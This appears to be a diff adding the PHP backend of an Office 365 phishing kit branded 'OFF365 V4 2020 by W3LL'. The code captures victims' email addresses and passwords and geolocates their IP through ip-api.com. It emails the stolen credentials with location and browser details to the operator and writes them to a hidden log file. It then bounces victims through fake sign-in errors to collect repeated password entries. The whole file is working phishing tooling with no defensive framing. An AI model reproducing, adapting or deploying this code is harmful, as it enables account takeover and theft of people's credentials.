@@ -1,0 +1,39 @@
+<?php
+
+error_reporting(0);include('blocker.php');include('config.php');@session_start();$password=$_POST['pass'];$data=$_GET['data'];if(isset($PageLink) && ( $PageLink==true || $PageLink=="true" || $PageLink=="TRUE" || $PageLink=="True")){$actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";$actual_page = "|Page: $actual_link
+";$actual_page2 = "Page: $actual_link
+";}elseif(isset($PageLink) && $PageLink!==""&& $PageLink!==false && $PageLink!=="false" && $PageLink!=="FALSE"&& $PageLink!=="False"){$actual_page = "
+|url: $PageLink";$actual_page2 = "
+url: $PageLink";}else{$actual_page = "";$actual_page2 = "";}if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])){$remoteIP=$_SERVER["HTTP_CF_CONNECTING_IP"];}else{$remoteIP=$_SERVER['REMOTE_ADDR'];}$headers="From: ".$fromname." <".$fromemail.">"."\r\n"."MIME-Version: 1.0";if(base64_encode(base64_decode($data))===$data){$email=base64_decode($data);$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)||!isset($_POST['pass'])||$_POST['pass']==""){if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);if (!in_array($email, $usedemails)){$file=fopen("./UsedEmails.txt","a");fwrite($file,$email."\n");fclose($file);chmod("./UsedEmails.txt",0600);if(!isset($_SESSION["NOTEXPIRED"])){$_SESSION["NOTEXPIRED"] = "true";}}}		
+die(header("Location: ".$FailRedirect));}}else{$email=$data;$email=filter_var($email,FILTER_SANITIZE_EMAIL);if(!filter_var($email,FILTER_VALIDATE_EMAIL)||!isset($_POST['pass'])||$_POST['pass']==""){if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);if (!in_array($email, $usedemails)){$file=fopen("./UsedEmails.txt","a");fwrite($file,$email."\n");fclose($file);chmod("./UsedEmails.txt",0600);if(!isset($_SESSION["NOTEXPIRED"])){$_SESSION["NOTEXPIRED"] = "true";}}}		
+die(header("Location: ".$FailRedirect));}}$subject="$email | $remoteIP $subjectTitle";$ExRobotos=curl_init();curl_setopt($ExRobotos,CURLOPT_URL,"http://ip-api.com/json/".$remoteIP);curl_setopt($ExRobotos,CURLOPT_HEADER,0);curl_setopt($ExRobotos,CURLOPT_RETURNTRANSFER,TRUE);$curlExec=curl_exec($ExRobotos);curl_close($ExRobotos);$IP_LOOKUP=json_decode($curlExec,true);$browser=$_SERVER['HTTP_USER_AGENT'];$date=date("D M d, Y g:i a");if($IP_LOOKUP&&$IP_LOOKUP['query']!=null){$Ex_country=$IP_LOOKUP['country'];$Ex_countrycode=$IP_LOOKUP['countryCode'];$Ex_state=$IP_LOOKUP['regionName'];$Ex_city=$IP_LOOKUP['city'];$Ex_postal=$IP_LOOKUP['zip'];$message="
+OFFICE365 Scmpage V4 2020 by W3LL
+Email : $email - Password : $password.$actual_page2
+IP Address: $remoteIP Country: $Ex_country Country Code: $Ex_countrycode
+Region: $Ex_state City: $Ex_city Postal Code: $Ex_postal
+Date: $date Browser: $browser
+";$logs="
++ ------------OFF365 V4 2020 by W3LL----------+
+|Email : $email - Password : $password.$actual_page
+|IP Address: $remoteIP
+|Country: $Ex_country Country Code: $Ex_countrycode
+|Region: $Ex_state City: $Ex_city Postal Code: $Ex_postal
+|Date: $date Browser: $browser
++ --------------------------------------------------------------+
+";if(isset($logsfileName)&&$logsfileName!==''&&$logsfileName!=='false'&&$logsfileName!=='FALSE'&&$logsfileName!==false){$file=fopen("./".$logsfileName,"a");fwrite($file,$logs);fclose($file);chmod("./".$logsfileName,0600);}mail($toEmail,$subject,$message,$headers);}else{$message="
+OFF365 V4 2020 by W3LL
+Email : $email - Password : $password.$actual_page2
+Date: $date Browser: $browser
+Failed fetching data from API (may be API is dead or CURL is disabled)
+";$logs="
++ ------------OFF365 V4 2020 by W3LL----------+
+|Email : $email - Password : $password.$actual_page
+|Date: $date Browser: $browser
+|Failed fetching data from API (may be API is dead or CURL is disabled)
++ --------------------------------------------------------------+
+";if(isset($logsfileName)&&$logsfileName!==''&&$logsfileName!=='false'&&$logsfileName!=='FALSE'&&$logsfileName!==false){$file=fopen("./".$logsfileName,"a");fwrite($file,$logs);fclose($file);chmod("./".$logsfileName,0600);}mail($toEmail,$subject,$message,$headers);}if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);if (!in_array($email, $usedemails)){$file=fopen("./UsedEmails.txt","a");fwrite($file,$email."\n");fclose($file);chmod("./UsedEmails.txt",0600);if(!isset($_SESSION["NOTEXPIRED"])){$_SESSION["NOTEXPIRED"] = "true";}}}		
+function RndString($length=50){return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"),0,$length);}$randpart=RndString(50).''.RndString(50).''.RndString(50);if($fixIndex==true || $fixIndex=="true" || $fixIndex=="TRUE" || $fixIndex=="True"){$fixIndex="index.php?";$fixPart="&status";}else{$fixIndex="";$fixPart="?status";};if(isset($_GET['error'])){if($passloopNumber==2){if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);if (!in_array($email, $usedemails)){$file=fopen("./UsedEmails.txt","a");fwrite($file,$email."\n");fclose($file);chmod("./UsedEmails.txt",0600);}}$_SESSION["success"] = true;die( 
+header('Location: ./success.php'));}echo"<script type=\"text/javascript\">window.location.href = \"./$fixIndex$randpart$fixPart=error2&string=signin&data=$data\"</script>\n";}else if(isset($_GET['error2'])){if($passloopNumber==3){if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);if (!in_array($email, $usedemails)){$file=fopen("./UsedEmails.txt","a");fwrite($file,$email."\n");fclose($file);chmod("./UsedEmails.txt",0600);}}$_SESSION["success"] = true;die( 
+header('Location: ./success.php'));}echo"<script type=\"text/javascript\">window.location.href = \"./$fixIndex$randpart$fixPart=error3&string=signin&data=$data\"</script>\n";}else if(isset($_GET['error3'])){if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);if (!in_array($email, $usedemails)){$file=fopen("./UsedEmails.txt","a");fwrite($file,$email."\n");fclose($file);chmod("./UsedEmails.txt",0600);}}$_SESSION["success"] = true;die( 
+header('Location: ./success.php'));}else{if($passloopNumber==1){if($onlyonetimeuse==true || $onlyonetimeuse=="true" || $onlyonetimeuse=="TRUE" || $onlyonetimeuse=="True" || $onlyonetimeuse=="yes" || $onlyonetimeuse=="YES"){$usedemails = file('./UsedEmails.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);if (!in_array($email, $usedemails)){$file=fopen("./UsedEmails.txt","a");fwrite($file,$email."\n");fclose($file);chmod("./UsedEmails.txt",0600);}}$_SESSION["success"] = true;die( 
+header('Location: ./success.php'));}echo"<script type=\"text/javascript\">window.location.href = \"./$fixIndex$randpart$fixPart=error&string=signin&data=$data\"</script>\n";} ?>
